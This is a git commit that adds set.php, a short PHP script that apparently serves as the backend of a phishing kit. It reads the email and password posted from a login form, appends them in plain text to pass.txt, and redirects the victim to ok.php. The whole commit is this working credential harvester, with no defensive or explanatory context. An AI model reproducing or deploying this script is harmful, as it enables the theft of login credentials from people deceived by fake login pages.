4fb27e5c2f92bd0949c8a0734385bd08f19baa0e
Siyasət Qubadov <azteam.org@bk.ru>
2017-07-24 02:05:41 +0400

    Create set.php

---
+++ set.php
@@ -0,0 +1,16 @@
+<?php 
+
+$email = $_POST['email'];
+$pass = $_POST['pass'];
+
+$dosya_adi = "pass.txt";
+$dosya = fopen ($dosya_adi , 'a+') or die ("Error!");
+
+fwrite ( $dosya , "
+Email : $email\r\n" ) ;
+fwrite ( $dosya , "Sifre : $pass\r\n" ) ;
+fwrite ( $dosya , "____________________\r\n" ) ;
+fclose ($dosya);
+
+header("Location: ok.php");
+?>
